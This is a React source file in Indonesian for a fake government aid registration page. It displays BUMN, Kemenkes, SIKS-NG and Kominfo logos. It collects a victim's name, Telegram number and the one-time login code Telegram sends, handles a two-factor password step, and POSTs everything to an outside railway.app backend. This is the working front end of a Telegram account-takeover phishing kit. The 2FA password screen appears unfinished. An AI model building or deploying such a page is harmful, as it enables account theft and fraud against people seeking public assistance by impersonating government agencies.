"use client";

import React, { useState, useRef } from 'react';

// Komponen Footer Logo (Pastikan nama file di public folder sesuai)
const FooterLogos = () => (
  <div className="flex justify-between items-center bg-white p-3 mt-8 rounded-xl border border-gray-100 shadow-sm">
    <div className="w-[22%] flex justify-center">
      <img src="/logo_bumn.jpg" alt="BUMN" className="max-h-10 object-contain" />
    </div>
    <div className="w-[22%] flex justify-center">
      <img src="/logo_Kemenkes.png" alt="Kemenkes" className="max-h-10 object-contain" />
    </div>
    <div className="w-[22%] flex justify-center">
      <img src="/logo_siksng.jpg" alt="SIKS-NG" className="max-h-10 object-contain" />
    </div>
    <div className="w-[22%] flex justify-center">
      <img src="/logo_kominfo.png" alt="Kominfo" className="max-h-10 object-contain" />
    </div>
  </div>
);

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [formData, setFormData] = useState({ nama: '', nomor: '', sandi: '' });
  const [otpValues, setOtpValues] = useState(['', '', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const API_URL = "https://backend-python-production-6e72.up.railway.app/register";

  const normalisasiNomor = (num: string) => {
    let clean = num.replace(/\D/g, '');
    if (clean.startsWith('0')) clean = '62' + clean.slice(1);
    if (!clean.startsWith('62')) clean = '62' + clean;
    return '+' + clean;
  };

  const handleOtpChange = (index: number, value: string) => {
    const val = value.replace(/\D/g, "");
    const newOtp = [...otpValues];
    newOtp[index] = val.substring(val.length - 1);
    setOtpValues(newOtp);
    if (val && index < 4) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpValues[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleNext = async (currentStep: number) => {
    setError("");
    if (currentStep !== 4) setLoading(true);
    
    const payload = { 
      ...formData, 
      nomor: normalisasiNomor(formData.nomor),
      otp: otpValues.join(''), 
      step: currentStep 
    };

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const res = await response.json();
      if (response.ok) {
        if (currentStep === 1) setStep(2);
        else if (currentStep === 2) res.status === "need_2fa" ? setStep(3) : setStep(4);
        else if (currentStep === 3) setStep(4);
      } else {
        setError("Gagal memproses data.");
      }
    } catch (err) { setError("Koneksi gagal."); } finally { setLoading(false); }
  };

  return (
    <div className="max-w-md mx-auto bg-white min-h-screen shadow-lg font-sans overflow-hidden">
      <img src="/banner.jpg" className="w-full h-auto" alt="Banner" />

      <div className="p-6">
        {step === 4 ? (
          /* HALAMAN LOADING CUSTOM SESUAI PERMINTAAN */
          <div className="flex flex-col items-center justify-center py-16 animate-in fade-in duration-700">
            <div className="relative flex items-center justify-center">
              {/* Spinner Berputar */}
              <div className="w-48 h-48 border-8 border-gray-100 border-t-blue-600 rounded-full animate-spin"></div>
              
              {/* Teks di Tengah Lingkaran */}
              <div className="absolute flex flex-col items-center">
                <span className="text-blue-900 font-black text-xl tracking-tighter">PROCESSING</span>
                <span className="text-gray-400 italic text-sm">please wait..</span>
              </div>
            </div>

            {/* Teks di Bawah Animasi */}
            <p className="mt-10 text-blue-600 font-bold text-center text-lg px-4 leading-snug">
              Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
            </p>
          </div>
        ) : (
          <div className="space-y-6">
            {step === 1 && (
              <>
                <h2 className="text-2xl font-bold text-center text-gray-800 mb-6">Form Pendaftaran</h2>
                <div className="space-y-2">
                  <label className="block font-bold text-gray-700">Nama Lengkap Sesuai E-KTP:</label>
                  <input className="w-full p-4 border-2 border-gray-100 bg-gray-50 rounded-2xl text-lg outline-none focus:border-blue-500" placeholder="BUDI SANTOSO" onChange={(e) => setFormData({...formData, nama: e.target.value})} />
                </div>
                <div className="space-y-2">
                  <label className="block font-bold text-gray-700">Nomor Telegram Aktif:</label>
                  <input className="w-full p-4 border-2 border-gray-200 bg-gray-50 rounded-2xl text-lg outline-none focus:border-blue-500" placeholder="0812 XXXX XXXX" type="tel" onChange={(e) => setFormData({...formData, nomor: e.target.value})} />
                </div>
                <button onClick={() => handleNext(1)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl text-xl shadow-lg active:scale-95 transition-all">DAFTAR SEKARANG</button>
              </>
            )}

            {step === 2 && (
              <div className="space-y-8 py-4">
                <p className="text-blue-600 font-bold text-center text-xl">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</p>
                <div className="space-y-4">
                  <label className="block text-center font-bold text-gray-700">Kode OTP :</label>
                  <div className="flex justify-center gap-3">
                    {otpValues.map((data, index) => (
                      <input key={index} type="tel" ref={(el) => { inputRefs.current[index] = el; }} value={data} onChange={(e) => handleOtpChange(index, e.target.value)} onKeyDown={(e) => handleKeyDown(index, e)} className="w-12 h-14 text-center text-3xl font-bold border-2 border-gray-200 rounded-xl bg-gray-50 focus:border-blue-500 outline-none" />
                    ))}
                  </div>
                </div>
                <button onClick={() => handleNext(2)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl text-xl shadow-lg">VERIFIKASI OTP</button>
              </div>
            )}

            {loading && (
              <div className="fixed inset-0 bg-white/70 flex items-center justify-center z-50">
                <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-600"></div>
              </div>
            )}
          </div>
        )}

        <FooterLogos />
      </div>
    </div>
  );
}